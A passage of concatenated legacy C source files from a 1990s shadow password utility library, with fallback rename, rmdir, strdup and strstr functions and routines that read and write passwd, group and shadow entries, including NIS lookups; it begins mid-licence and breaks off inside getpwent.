 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: rename.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include "defines.h"
#include <sys/stat.h>
#include <errno.h>

/*
 * rename - rename a file to another name
 *
 *	rename is provided for systems which do not include the rename()
 *	system call.
 */

int
rename (begin, end)
	const char *begin;
	const char *end;
{
	struct	stat	s1, s2;
	extern	int	errno;
	int	orig_err = errno;

	if (stat (begin, &s1))
		return -1;

	if (stat (end, &s2)) {
		errno = orig_err;
	} else {

		/*
		 * See if this is a cross-device link.  We do this to
		 * insure that the link below has a chance of working.
		 */

		if (s1.st_dev != s2.st_dev) {
			errno = EXDEV;
			return -1;
		}

		/*
		 * See if we can unlink the existing destination
		 * file.  If the unlink works the directory is writable,
		 * so there is no need here to figure that out.
		 */

		if (unlink (end))
			return -1;
	}

	/*
	 * Now just link the original name to the final name.  If there
	 * was no file previously, this link will fail if the target
	 * directory isn't writable.  The unlink will fail if the source
	 * directory isn't writable, but life stinks ...
	 */

	if (link (begin, end) || unlink (begin))
		return -1;

	return 0;
}
/*
 * Copyright 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#include <fcntl.h>

#include "rcsid.h"
RCSID("$Id: rmdir.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

/*
 * rmdir - remove a directory
 *
 *	rmdir is provided for systems which do not include the rmdir()
 *	system call.
 */

int
rmdir (dir)
	const char *dir;
{
	int status;

	if (fork ()) {
		while (wait (&status) != -1)
			;

		return status >> 8;
	}
	close (2);
	open ("/dev/null", O_WRONLY);
	execl ("/bin/rmdir", "rmdir", dir, 0);
	_exit (128);
	/*NOTREACHED*/
}
#include <config.h>
#include "defines.h"
#include "rcsid.h"
RCSID("$Id: strdup.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

extern char *malloc();

char *
strdup(str)
	const char *str;
{
	char *s = malloc(strlen(str) + 1);

	if (s)
		strcpy(s, str);
	return s;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#include "defines.h"

#include "rcsid.h"
RCSID("$Id: strstr.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

/*
 * strstr - find substring in string
 */

static char *
strstr (string, pattern)
	const char *string;
	const char *pattern;
{
	char	*cp;
	int	len;

	len = strlen (pattern);

	for (cp = string;cp = strchr (cp, *pattern);) {
		if (strncmp (cp, pattern, len) == 0)
			return cp;

		cp++;
	}
	return 0;
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include <stdio.h>
#include <grp.h>
#include "prototypes.h"
#include "defines.h"

int
putgrent(g, f)
	const struct group *g;
	FILE *f;
{
	int	i;
	char	*cp;
	char *buf, *rbuf;
	size_t size;

	if (! g || ! f)
		return -1;

	size = 1024;
	if (!(buf = malloc(size)))
		return -1;

	sprintf (buf, "%s:%s:%d:", g->gr_name, g->gr_passwd, g->gr_gid);
	if (g->gr_mem) {
		cp = buf + strlen(buf);
		for (i = 0;g->gr_mem[i];i++) {
			if ((cp - buf) + strlen (g->gr_mem[i]) + 2 >= size) {
				size += size;
				rbuf = realloc(buf, size);
				if (!rbuf) {
					free(buf);
					return -1;  /* No more hope.. */
				}
				buf = rbuf;
			}

			if (i > 0) {
				strcpy (cp, ",");
				cp++;
			}
			strcpy (cp, g->gr_mem[i]);
			cp = strchr (cp, '\0');
		}
		strcat (cp, "\n");
	} else
		strcat (buf, "\n");

	if (fputsx (buf, f) == EOF || ferror (f)) {
		free(buf);
		return -1;
	}

	free(buf);
	return 0;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: putpwent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include "defines.h"
#include <stdio.h>
#include <pwd.h>

/*
 * putpwent - Output a (struct passwd) in character format
 *
 *	putpwent() writes out a (struct passwd) in the format it appears
 *	in in flat ASCII files.
 *
 *	(Author: Dr. Micheal Newberry)
 */

int
putpwent (p, f)
	const struct passwd *p;
	FILE *f;
{
	int status;

#if defined(SUN) || defined(BSD) || defined(SUN4)
	status = fprintf (f, "%s:%s:%d:%d:%s,%s:%s:%s\n",
		p->pw_name, p->pw_passwd, p->pw_uid, p->pw_gid,
		p->pw_gecos, p->pw_comment, p->pw_dir, p->pw_shell) == EOF;
#else
	status = fprintf (f, "%s:%s", p->pw_name, p->pw_passwd) == EOF;
#ifdef	ATT_AGE
	if (p->pw_age && p->pw_age[0])
		status |= fprintf (f, ",%s", p->pw_age) == EOF;
#endif
	status |= fprintf (f, ":%d:%d:%s", p->pw_uid, p->pw_gid,
		p->pw_gecos) == EOF;
#ifdef	ATT_COMMENT
	if (p->pw_comment && p->pw_comment[0])
		status |= fprintf (f, ",%s", p->pw_comment) == EOF;
#endif
	status |= fprintf (f, ":%s:%s\n", p->pw_dir, p->pw_shell) == EOF;
#endif
	return status;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef SHADOWPWD /*{*/
#ifndef HAVE_PUTSPENT

#include "rcsid.h"
RCSID("$Id: putspent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "prototypes.h"
#include "defines.h"
#include <stdio.h>

int
putspent (sp, fp)
	const struct spwd *sp;
	FILE	*fp;
{
	int	errors = 0;

	if (! fp || ! sp)
		return -1;

	if (fprintf (fp, "%s:%s:", sp->sp_namp, sp->sp_pwdp) < 0)
		errors++;

	if (sp->sp_lstchg != -1) {
		if (fprintf (fp, "%ld:", sp->sp_lstchg) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_min != -1) {
		if (fprintf (fp, "%ld:", sp->sp_min) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_max != -1) {
		if (fprintf (fp, "%ld:", sp->sp_max) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_warn != -1) {
		if (fprintf (fp, "%ld:", sp->sp_warn) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_inact != -1) {
		if (fprintf (fp, "%ld:", sp->sp_inact) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_expire != -1) {
		if (fprintf (fp, "%ld:", sp->sp_expire) < 0)
			errors++;
	} else if (putc (':', fp) == EOF)
		errors++;

	if (sp->sp_flag != -1) {
		if (fprintf (fp, "%ld", sp->sp_flag) < 0)
			errors++;
	}
	if (putc ('\n', fp) == EOF)
		errors++;

	if (errors)
		return -1;
	else
		return 0;
}
#endif
#endif	/*}*/
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: sgetgrent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <stdio.h>
#include <grp.h>
#include "defines.h"

#define	NFIELDS	4
#define	MAXMEM	1024  /* really want to allocate it dynamically.  --marekm */

/*
 * list - turn a comma-separated string into an array of (char *)'s
 *
 *	list() converts the comma-separated list of member names into
 *	an array of character pointers.
 *
 *	WARNING: I profiled this once with and without strchr() calls
 *	and found that using a register variable and an explicit loop
 *	works best.  For large /etc/group files, this is a major win.
 */

static char **
list (s)
register char	*s;
{
	static char *members[MAXMEM+1];
	int	nmembers = 0;

	while (s && *s) {
		members[nmembers++] = s;
		while (*s && *s != ',')
			s++;

		if (*s)
			*s++ = '\0';
	}
	members[nmembers] = (char *) 0;
	return members;
}

struct group *
sgetgrent (buf)
	const char *buf;
{
	static char grpbuf[4*BUFSIZ];
	static char *grpfields[NFIELDS];
	static struct group grent;
	int	i;
	char	*cp;

	strncpy (grpbuf, buf, sizeof grpbuf);
	grpbuf[sizeof grpbuf - 1] = '\0';
	if ((cp = strrchr (grpbuf, '\n')))
		*cp = '\0';

	for (cp = grpbuf, i = 0;i < NFIELDS && cp;i++) {
		grpfields[i] = cp;
		if ((cp = strchr (cp, ':')))
			*cp++ = 0;
	}
	if (i < (NFIELDS-1) || *grpfields[2] == '\0')
		return 0;
	grent.gr_name = grpfields[0];
	grent.gr_passwd = grpfields[1];
	grent.gr_gid = atoi (grpfields[2]);
	grent.gr_mem = list (grpfields[3]);

	return (&grent);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: sgetpwent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "defines.h"
#include <stdio.h>
#include <pwd.h>

/*
 * If AUTOSHADOW is enabled, the getpwnam and getpwuid calls will
 * fill in the pw_passwd and pw_age fields from the passwd and
 * shadow files.
 */

#if defined(AUTOSHADOW) && !defined(SHADOWPWD)
#undef	AUTOSHADOW
#endif

/*
 * If DBM or NDBM is enabled, the getpwnam and getpwuid calls will
 * go to the database files to look for the requested entries.
 */

#ifdef	DBM
#include <dbm.h>
#endif
#ifdef	NDBM
#include <ndbm.h>
#include <fcntl.h>
DBM	*pw_dbm;
int	pw_dbm_mode = -1;
#endif

#define	SBUFSIZ	64
#define	NFIELDS	7

#ifdef	GETPWENT
static	char	*pwdfile = PASSWD_FILE;
static	FILE	*pwdfp;
#endif
static	char	pwdbuf[BUFSIZ];
#if defined(DBM) || defined(NDBM)
static	int	dbmopened;
static	int	dbmerror;
#endif
static	char	*pwdfields[NFIELDS];
static	struct	passwd	pwent;

#ifdef	USE_NIS
static	char	NISpwdbuf[BUFSIZ];
static	char	*NISpwdfields[NFIELDS];
static	struct	passwd	NISpwent;
static	int	nis_used;
static	int	nis_ignore;
static	enum	{ native, start, middle, native2 } nis_state;
static	int	nis_bound;
static	char	*nis_domain;
static	char	*nis_key;
static	int	nis_keylen;
static	char	*nis_val;
static	int	nis_vallen;
#define	IS_NISCHAR(c) ((c)=='+')
#endif

#ifdef	USE_NIS

/*
 * __setpwNIS - turn on or off NIS searches
 */

void
__setpwNIS (flag)
int	flag;
{
	nis_ignore = ! flag;

	if (nis_ignore)
		nis_used = 0;
}

/*
 * __ispwNIS - last getpw* returned a NIS user
 */

int
__ispwNIS (void)
{
	return nis_state == middle;
}

/*
 * bind_nis - bind to NIS server
 */

static int
bind_nis ()
{
	if (yp_get_default_domain (&nis_domain))
		return -1;

	nis_bound = 1;
	return 0;
}
#endif

#if defined(AUTOSHADOW) && defined(ATT_AGE) && defined(GETPWENT)
/*
 * sptopwage - convert shadow ages to AT&T-style pw_age ages
 *
 *	sptopwage() converts the values in the shadow password
 *	entry to the format used in the old-style password
 *	entry.
 */

static char *
sptopwage (spwd)
struct	spwd	*spwd;
{
	static	char	age[5];
	long	min;
	long	max;
	long	last;

	if ((min = (spwd->sp_min * SCALE / WEEK)) < 0)
		min = 0;
	else if (min >= 64)
		min = 63;

	if ((max = (spwd->sp_max * SCALE / WEEK)) < 0)
		max = 0;
	else if (max >= 64)
		max = 63;

	if ((last = (spwd->sp_lstchg * SCALE / WEEK)) < 0)
		last = 0;
	else if (last >= 4096)
		last = 4095;

	age[0] = i64c (max);
	age[1] = i64c (min);
	age[2] = i64c (last % 64);
	age[3] = i64c (last / 64);
	age[4] = '\0';
	return age;
}
#endif

/*
 * sgetpwent - convert a string to a (struct passwd)
 *
 * sgetpwent() parses a string into the parts required for a password
 * structure.  Strict checking is made for the UID and GID fields and
 * presence of the correct number of colons.  Any failing tests result
 * in a NULL pointer being returned.
 *
 * NOTE: This function uses hard-coded string scanning functions for
 *	performance reasons.  I am going to come up with some conditional
 *	compilation glarp to improve on this in the future.
 */

struct passwd *
sgetpwent (buf)
char	*buf;
{
	register int	i;
	register char	*cp;
	char	*ep;
	char	**fields;
	char	*buffer;
	struct	passwd	*pwd;

	/*
	 * Get my pointers all set up.
	 */
#ifdef	USE_NIS
	if (IS_NISCHAR (buf[0])) {
		fields = NISpwdfields;
		buffer = NISpwdbuf;
		pwd = &NISpwent;
	} else
#endif
	{
		fields = pwdfields;
		buffer = pwdbuf;
		pwd = &pwent;
	}


	/*
	 * Copy the string to a static buffer so the pointers into
	 * the password structure remain valid.
	 */

	strncpy (buffer, buf, BUFSIZ);
	pwdbuf[BUFSIZ-1] = '\0';

	/*
	 * Save a pointer to the start of each colon separated
	 * field.  The fields are converted into NUL terminated strings.
	 */

	for (cp = buffer, i = 0;i < NFIELDS && cp;i++) {
		fields[i] = cp;
		while (*cp && *cp != ':')
			++cp;
	
		if (*cp)
			*cp++ = '\0';
		else
			cp = 0;
	}

	/*
	 * There must be exactly NFIELDS colon separated fields or
	 * the entry is invalid.  Also, the UID and GID must be non-blank.
	 */

	if (i != NFIELDS || *fields[2] == '\0' || *fields[3] == '\0') {
#ifdef	USE_NIS
		if (! IS_NISCHAR (fields[0][0]))
			return 0;
		else
			nis_used = 1;
#else
		return 0;
#endif
	}

	/*
	 * Each of the fields is converted the appropriate data type
	 * and the result assigned to the password structure.  If the
	 * UID or GID does not convert to an integer value, a NULL
	 * pointer is returned.
	 */

	pwd->pw_name = fields[0];
#ifdef	USE_NIS
	if (IS_NISCHAR (fields[0][0]))
		nis_used = 1;
#endif
	pwd->pw_passwd = fields[1];
	if (fields[2][0] == '\0' ||
		((pwd->pw_uid = strtol (fields[2], &ep, 10)) == 0 && *ep)) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			pwd->pw_uid = -1;
#else
		return 0;
#endif
	}
	if (fields[3][0] == '\0' ||
		((pwd->pw_gid = strtol (fields[3], &ep, 10)) == 0 && *ep)) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			pwd->pw_gid = -1;
#else
		return 0;
#endif
	}
#ifdef	ATT_AGE
	cp = pwd->pw_passwd;
	while (*cp && *cp != ',')
		++cp;

	if (*cp) {
		*cp++ = '\0';
		pwd->pw_age = cp;
	} else {
		cp = 0;
		pwd->pw_age = "";
	}
#endif
	pwd->pw_gecos = fields[4];
#ifdef	ATT_COMMENT
	pwd->pw_comment = "";
#endif
	pwd->pw_dir = fields[5];
	pwd->pw_shell = fields[6];

	return (pwd);
}

#ifdef	GETPWENT

/*
 * fgetpwent - get a password file entry from a stream
 *
 * fgetpwent() reads the next line from a password file formatted stream
 * and returns a pointer to the password structure for that line.
 */

struct passwd *
fgetpwent (fp)
FILE	*fp;
{
	char	buf[BUFSIZ];

#ifdef	USE_NIS
	while (fgets (buf, BUFSIZ, fp) != (char *) 0)
#else
	if (fgets (buf, BUFSIZ, fp) != (char *) 0)
#endif
	{
		buf[strlen (buf) - 1] = '\0';
#ifdef	USE_NIS
		if (nis_ignore && IS_NISCHAR (buf[0]))
			continue;
#endif
		return (sgetpwent (buf));
	}
	return 0;
}

/*
 * endpwent - close a password file
 *
 * endpwent() closes the password file if open.  if autoshadowing is
 * enabled the system must also end access to the shadow files since
 * the user is probably unaware it was ever accessed.
 */

SETXXENT_TYPE
endpwent ()
{
	if (pwdfp)
		if (fclose (pwdfp))
			SETXXENT_RET(-1);
	pwdfp = 0;
#ifdef	NDBM
	if (dbmopened && pw_dbm) {
		dbm_close (pw_dbm);
		dbmopened = 0;
		dbmerror = 0;
		pw_dbm = 0;
	}
#endif
#ifdef	AUTOSHADOW
	endspent ();
#endif
	SETXXENT_RET(0);
}

/*
 * getpwent - get a password entry from the password file
 *
 * getpwent() opens the password file, if not already opened, and reads
 * a single entry.  NULL is returned if any errors are encountered reading
 * the password file.
 */

struct passwd *
getpwent ()
{
#ifdef	USE_NIS
	int	nis_1_user = 0;
	struct	passwd	*val;
	struct	passwd	*NISval;
	char	buf[BUFSIZ];
	char	*cp;
	static	char	save_name[16];
#endif
	if (! pwdfp) {
		(void) setpwent ();
		if (! pwdfp)
			return 0;
	}
#ifdef	USE_NIS
again:
	/*
	 * See if we are reading from the local file.
	 */

	if (nis_state == native || nis_state == native2) {

		/*
		 * Get the next entry from the password file.  Return NULL
		 * right away if there is none.
		 */

		if (! (val = fgetpwent (pwdfp)))
			return 0;

		/*
		 * If this entry began with a NIS escape character, we have
		 * to see if this is just a single user, or if the entire
		 * map is being asked for.
		 */

		if (IS_NISCHAR (val->pw_name[0])) {
			if (val->pw_name[1])
				nis_1_user = 1;
			else
				nis_state = start;
		}

		/*
		 * If this isn't a NIS user and this isn't an escape to go
		 * use a NIS map, it must be a regular local user.
		 */

		if (nis_1_user == 0 && nis_state != start)
			return val;

		/*
		 * If this is an escape to use an NIS map, switch over to
		 * that bunch of code.
		 */

		if (nis_state == start)
			goto again;

		/*
		 * NEEDSWORK.  Here we substitute pieces-parts of this entry.
		 * As a first stab, let's call getpwnam() with the name we
		 * just matched, after skipping over the NIS glarp.
		 */

		if (! nis_bound)
			bind_nis ();

		if (! nis_bound)
			goto again;

		if (yp_match (nis_domain, "passwd.byname", val->pw_name + 1,
				strlen (val->pw_name + 1),
				&nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			if (! (NISval = sgetpwent (nis_val)))
				goto again;
		} else
			goto again;

		/*
		 * NISval points to the reply from NIS, and val points to
		 * the value we got from the local file.
		 */

		val->pw_name++;

		if (val->pw_passwd[0] == '*')
			val->pw_passwd = NISval->pw_passwd;
#ifdef	ATT_AGE
		if (val->pw_age[0] == '\0')
			val->pw_age = NISval->pw_age;
#endif
		if (val->pw_uid == -1)
			val->pw_uid = NISval->pw_uid;
		if (val->pw_gid == -1)
